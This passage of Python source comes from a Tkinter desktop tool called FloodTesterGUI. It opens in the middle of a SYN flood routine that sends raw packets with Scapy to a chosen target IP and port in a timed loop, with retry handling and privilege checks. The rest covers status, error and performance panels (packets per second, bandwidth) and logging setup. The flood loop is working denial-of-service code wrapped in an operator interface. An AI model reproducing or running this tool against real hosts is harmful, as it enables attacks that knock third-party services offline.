                    "packet_size": packet_size
                }
            )
            return
        
        print(f"Starting SYN flood to {target_ip}:{port}")
        
        # Packet sending loop with error recovery
        while time.time() < end_time:
            try:
                # Check if administrator privileges are available for raw socket
                if platform.system() == "Windows" and not self._is_admin():
                    raise PermissionError("Administrator privileges required for SYN flooding on Windows")
                
                # Send packet with interface specification
                send(packet, verbose=0, iface=selected_interface)
                packets_sent += 1
                retry_count = 0  # Reset retry count on success
                
                # Update status
                self.total_packets_sent += 1
                if packets_sent % 100 == 0:  # Update status every 100 packets
                    print(f"Sent {packets_sent} SYN packets to {target_ip}:{port}")
                
                time.sleep(delay)
                
            except Exception as e:
                retry_count += 1
                error_details = {
                    "target": target_ip,
                    "port": port,
                    "interface": selected_interface,
                    "retries": retry_count,
                    "packets_sent": packets_sent
                }
                
                if isinstance(e, PermissionError):
                    self.error_manager.handle_error(
                        "permission_error",
                        str(e),
                        ErrorLevel.CRITICAL,
                        error_details
                    )
                    break
                elif "Network is unreachable" in str(e):
                    self.error_manager.handle_error(
                        "network_error",
                        f"Network unreachable: {str(e)}",
                        ErrorLevel.ERROR,
                        error_details
                    )
                else:
                    self.error_manager.handle_error(
                        "send_error",
                        f"Error sending packet: {str(e)}",
                        ErrorLevel.WARNING,
                        error_details
                    )
                
                if retry_count >= max_retries:
                    print(f"Failed to send packet after {max_retries} retries")
                    break
                
                time.sleep(1)  # Wait before retry
        
        print(f"Completed sending {packets_sent} SYN packets to {target_ip}:{port}")
        return packets_sent

    def create_error_display(self, parent):
        """Create error display panel."""
        error_frame = ttk.LabelFrame(parent, text="Error Monitor", padding="5")
        error_frame.grid(row=3, column=0, sticky=(tk.W, tk.E), pady=5)
        
        # Error count by severity
        counts_frame = ttk.Frame(error_frame)
        counts_frame.pack(fill=tk.X, pady=2)
        
        for level in ErrorLevel:
            frame = ttk.Frame(counts_frame)
            frame.pack(side=tk.LEFT, padx=5)
            ttk.Label(frame, text=f"{level.value}:").pack(side=tk.LEFT)
            count_label = ttk.Label(frame, text="0")
            count_label.pack(side=tk.LEFT, padx=2)
            setattr(self, f"{level.value.lower()}_count", count_label)
        
        # Latest error display
        self.error_text = scrolledtext.ScrolledText(error_frame, height=3)
        self.error_text.pack(fill=tk.X, pady=2)
        
        # Recovery status
        status_frame = ttk.Frame(error_frame)
        status_frame.pack(fill=tk.X, pady=2)
        ttk.Label(status_frame, text="Recovery Status:").pack(side=tk.LEFT)
        self.recovery_label = ttk.Label(status_frame, text="No errors")
        self.recovery_label.pack(side=tk.LEFT, padx=5)

    def update_error_display(self, error: FloodTesterError):
        """Update error display with new error information."""
        # Update count
        count_label = getattr(self, f"{error.level.value.lower()}_count")
        current = int(count_label.cget("text"))
        count_label.config(text=str(current + 1))
        
        # Update error text
        timestamp = error.timestamp.strftime("%H:%M:%S")
        self.error_text.insert(tk.END, 
            f"[{timestamp}] {error.level.value}: {error.message}\n")
        self.error_text.see(tk.END)
        
        # Update recovery status
        if error.recovered:
            status = f"Recovered (attempt {error.recovery_attempts})"
        elif error.recovery_attempts > 0:
            status = f"Recovery failed (attempt {error.recovery_attempts})"
        else:
            status = "No recovery attempted"
        self.recovery_label.config(text=status)

    def update_status(self):
        """Update status indicators periodically."""
        if self.is_running:
            self.progress.start(10)
            self.status_var.set("Running...")
        else:
            self.progress.stop()
            self.status_var.set("Ready")
        
        # Update statistics
        self.packets_label.config(text=str(self.total_packets_sent))
        self.errors_label.config(text=str(self.error_count))
        
        if self.total_packets_sent > 0:
            success_rate = ((self.total_packets_sent - self.error_count) / 
                          self.total_packets_sent * 100)
            self.rate_label.config(text=f"{success_rate:.1f}%")
        
        # Update interface status
        interface = self.get_selected_interface()
        if interface:
            self.if_status.config(text=interface)
        elif self.interface_var.get() == "auto":
            self.if_status.config(text="Auto-detect")
        else:
            self.if_status.config(text="Not Selected")
        
        # Schedule next update
        self.root.after(1000, self.update_status)

    def _is_admin(self):
        """Check if the application is running with administrator privileges."""
        try:
            return os.getuid() == 0
        except AttributeError:
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False

    def create_status_indicators(self, parent):
        """Create real-time status indicators."""
        status_frame = ttk.LabelFrame(parent, text="Status", padding="5")
        status_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=5)
        
        # Packets sent
        packets_frame = ttk.Frame(status_frame)
        packets_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(packets_frame, text="Packets Sent:").pack(side=tk.LEFT)
        self.packets_label = ttk.Label(packets_frame, text="0")
        self.packets_label.pack(side=tk.RIGHT)
        
        # Error count
        errors_frame = ttk.Frame(status_frame)
        errors_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(errors_frame, text="Errors:").pack(side=tk.LEFT)
        self.errors_label = ttk.Label(errors_frame, text="0")
        self.errors_label.pack(side=tk.RIGHT)
        
        # Success rate
        rate_frame = ttk.Frame(status_frame)
        rate_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(rate_frame, text="Success Rate:").pack(side=tk.LEFT)
        self.rate_label = ttk.Label(rate_frame, text="100%")
        self.rate_label.pack(side=tk.RIGHT)
        
        # Interface status
        if_frame = ttk.Frame(status_frame)
        if_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(if_frame, text="Interface:").pack(side=tk.LEFT)
        self.if_status = ttk.Label(if_frame, text="Not Selected")
        self.if_status.pack(side=tk.RIGHT)

    def refresh_interfaces(self):
        """Refresh the list of network interfaces."""
        self.interfaces = self.get_network_interfaces()
        if self.interfaces:
            self.interface_combo['values'] = [
                f"{i['friendly_name']} ({i['ip']})" for i in self.interfaces
            ]
            self.interface_combo.set(self.interface_combo['values'][0] if self.interfaces else "")
            self.interface_status.config(
                text="Status: Interfaces refreshed successfully",
                foreground="dark green"
            )
        else:
            self.interface_status.config(
                text="Status: No interfaces found",
                foreground="red"
            )

    def validate_interface(self, event=None):
        """Validate the selected interface."""
        if self.interface_var.get() == "manual":
            selected = self.interface_combo.get()
            valid_interface = None
            
            # Find matching interface
            for interface in self.interfaces:
                display_name = f"{interface['friendly_name']} ({interface['ip']})"
                if selected == display_name:
                    valid_interface = interface
                    break
            
            if valid_interface:
                self.interface_status.config(
                    text=f"Status: Valid interface selected - {valid_interface['friendly_name']} ({valid_interface['ip']})",
                    foreground="dark green"
                )
            else:
                self.interface_status.config(
                    text="Status: Invalid interface selected",
                    foreground="red"
                )

    def update_interface_status(self):
        """Update interface selection status."""
        if self.interface_var.get() == "auto":
            self.interface_combo.config(state="disabled")
            self.interface_status.config(
                text="Status: Using auto-detection",
                foreground="dark blue"
            )
        else:
            self.interface_combo.config(state="normal")
            self.validate_interface()

    def create_performance_display(self, parent):
        """Create performance metrics display."""
        perf_frame = ttk.LabelFrame(parent, text="Performance Monitor", padding="5")
        perf_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=5)
        
        # Packets per second
        pps_frame = ttk.Frame(perf_frame)
        pps_frame.pack(fill=tk.X, pady=2)
        ttk.Label(pps_frame, text="Packets/sec:").pack(side=tk.LEFT)
        self.pps_label = ttk.Label(pps_frame, text="0")
        self.pps_label.pack(side=tk.RIGHT)
        
        # Bandwidth
        bw_frame = ttk.Frame(perf_frame)
        bw_frame.pack(fill=tk.X, pady=2)
        ttk.Label(bw_frame, text="Bandwidth:").pack(side=tk.LEFT)
        self.bw_label = ttk.Label(bw_frame, text="0 Mbps")
        self.bw_label.pack(side=tk.RIGHT)
        
        # CPU Usage
        cpu_frame = ttk.Frame(perf_frame)
        cpu_frame.pack(fill=tk.X, pady=2)
        ttk.Label(cpu_frame, text="CPU Usage:").pack(side=tk.LEFT)
        self.cpu_label = ttk.Label(cpu_frame, text="0%")
        self.cpu_label.pack(side=tk.RIGHT)
        
        # Memory Usage
        mem_frame = ttk.Frame(perf_frame)
        mem_frame.pack(fill=tk.X, pady=2)
        ttk.Label(mem_frame, text="Memory:").pack(side=tk.LEFT)
        self.mem_label = ttk.Label(mem_frame, text="0%")
        self.mem_label.pack(side=tk.RIGHT)
        
        # Start periodic updates
        self.update_performance_display()
    
    def update_performance_display(self):
        """Update performance metrics display."""
        if self.is_running:
            metrics = self.perf_monitor.get_average_metrics(seconds=5)
            
            # Update labels with formatted values
            self.pps_label.config(text=f"{metrics.packets_per_second:.1f}")
            
            # Convert bandwidth to Mbps
            mbps = (metrics.bandwidth_bps * 8) / 1_000_000
            self.bw_label.config(text=f"{mbps:.2f} Mbps")
            
            self.cpu_label.config(text=f"{metrics.cpu_usage:.1f}%")
            self.mem_label.config(text=f"{metrics.memory_usage:.1f}%")
        
        # Schedule next update
        self.root.after(1000, self.update_performance_display)

def setup_logging():
    """Configure detailed logging for debugging."""
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Configure root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.DEBUG)
    
    # Console handler with less verbose output
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    console_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console_handler.setFormatter(console_format)
    root_logger.addHandler(console_handler)
    
    # File handler with detailed debug output
    debug_file = os.path.join('logs', f'debug_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
    file_handler = logging.handlers.RotatingFileHandler(
        debug_file, maxBytes=10*1024*1024, backupCount=5
    )
    file_handler.setLevel(logging.DEBUG)
    file_format = logging.Formatter(
        '%(asctime)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s'
    )
    file_handler.setFormatter(file_format)
    root_logger.addHandler(file_handler)
    
    return debug_file

def log_exception(e, context=""):
    """Log an exception with full traceback and context."""
    logging.error(f"Exception in {context}: {str(e)}")
    logging.debug(f"Full traceback:\n{''.join(traceback.format_tb(e.__traceback__))}")

if __name__ == "__main__":
    debug_file = setup_logging()
    logging.info(f"Debug log file: {debug_file}")
    logging.info(f"Platform: {platform.system()} {platform.release()}")
    logging.info(f"Python version: {sys.version}")
    logging.info(f"Scapy available: {SCAPY_AVAILABLE}")
    
    root = tk.Tk()
    app = FloodTesterGUI(root)
    root.mainloop() 